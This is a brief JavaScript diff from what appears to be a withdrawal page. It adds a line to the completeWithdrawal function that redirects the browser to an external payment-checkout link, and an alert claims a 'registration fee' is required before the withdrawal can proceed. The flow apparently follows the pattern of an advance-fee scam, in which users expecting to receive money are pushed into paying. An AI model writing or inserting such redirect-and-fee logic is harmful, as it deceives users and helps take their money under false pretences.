@@ -23,6 +23,7 @@ function goToStep2() {
 
 // Complete withdrawal process
 function completeWithdrawal() {
+  window.location.href = "https://go.perfectpay.com.br/PPU38CORIT3";
   alert(
     "Please complete the registration fee to proceed. You are being redirected to the registrations site"
   );
